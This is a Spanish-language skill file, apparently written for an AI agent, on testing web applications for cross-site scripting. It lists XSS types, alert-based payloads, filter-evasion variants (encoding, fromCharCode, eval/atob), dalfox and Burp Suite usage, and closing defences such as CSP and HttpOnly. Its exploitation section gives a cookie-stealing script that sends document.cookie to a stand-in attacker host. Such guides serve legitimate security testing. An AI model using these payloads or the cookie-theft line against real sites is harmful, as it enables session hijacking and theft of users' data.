---
name: xss-testing
description: Habilidad profesional para pruebas de ataques de secuencias de comandos en sitios cruzados (XSS)
version: 1.0.0
---

# Habilidad de pruebas XSS

## Descripción general

El ataque de secuencias de comandos en sitios cruzados (XSS) permite a un atacante ejecutar código JavaScript malicioso en el navegador de la víctima. Esta habilidad cubre los métodos de prueba para XSS reflejado, almacenado y basado en DOM.

## Tipos de XSS

### 1. XSS reflejado (Reflected XSS)
- El script malicioso se pasa a través de parámetros de URL.
- El servidor devuelve directamente la respuesta que contiene el script.
- Requiere que el usuario haga clic en un enlace malicioso.

### 2. XSS almacenado (Stored XSS)
- El script malicioso se almacena en el servidor (base de datos, archivos, etc.).
- Todos los usuarios que visiten la página afectada ejecutarán el script.
- El alcance del impacto es mayor.

### 3. XSS basado en DOM (DOM-based XSS)
- El JavaScript del lado del cliente maneja incorrectamente la entrada del usuario.
- No involucra procesamiento del lado del servidor.
- Se activa modificando la estructura del DOM.

## Métodos de prueba

### Payload básico
```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

### Evasión de filtros

#### Evasión por mayúsculas y minúsculas
```javascript
<ScRiPt>alert('XSS')</ScRiPt>
```

#### Evasión por codificación
```javascript
%3Cscript%3Ealert('XSS')%3C/script%3E
&#60;script&#62;alert('XSS')&#60;/script&#62;
```

#### Manejadores de eventos
```javascript
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
<div onmouseover=alert('XSS')>hover</div>
<input onfocus=alert('XSS') autofocus>
```

#### Pseudoprotocolos
```javascript
<a href="javascript:alert('XSS')">click</a>
<iframe src="javascript:alert('XSS')">
```

### Técnicas avanzadas de evasión

#### Uso de String.fromCharCode
```javascript
<script>alert(String.fromCharCode(88,83,83))</script>
```

#### Uso de eval y atob
```javascript
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
```

#### Uso de entidades HTML
```javascript
&#60;script&#62;alert('XSS')&#60;/script&#62;
```

## Uso de herramientas

### dalfox
```bash
# Escaneo básico
dalfox url "http://target.com/page?q=test"

# Especificar parámetros
dalfox url "http://target.com/page" -d "q=test" -X POST

# Usar payload personalizado
dalfox url "http://target.com/page?q=test" --custom-payload payloads.txt
```

### Burp Suite
- Usar el módulo Intruder para pruebas por lotes.
- Usar Repeater para pruebas manuales.
- Usar Scanner para detección automática.

### Consola del navegador
- Probar XSS basado en DOM.
- Inspeccionar el entorno de ejecución de JavaScript.
- Depurar payloads.

## Verificación y explotación

### Pasos de verificación
1. Confirmar que el payload se ejecuta.
2. Comprobar si está filtrado o codificado.
3. Probar diferentes contextos (HTML, JavaScript, atributos, etc.).
4. Evaluar el impacto (robo de cookies, secuestro de sesión, etc.).

### Escenarios de explotación
- Robo de cookies: `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`
- Registro de pulsaciones de teclas: inyectar un detector de eventos de teclado.
- Ataques de phishing: falsificar formularios de inicio de sesión.
- Secuestro de sesión: obtener el token de sesión del usuario.

## Puntos clave del informe

- Tipo de XSS (reflejado/almacenado/DOM).
- Ubicación de activación y parámetros.
- POC completo.
- Evaluación de impacto.
- Sugerencias de corrección (codificación de salida, políticas CSP, etc.).

## Medidas de protección

- Validación y filtrado de entradas.
- Codificación de salida (HTML, JavaScript, URL).
- Content Security Policy (CSP).
- Indicador HttpOnly para cookies.
- Uso de marcos y bibliotecas seguros.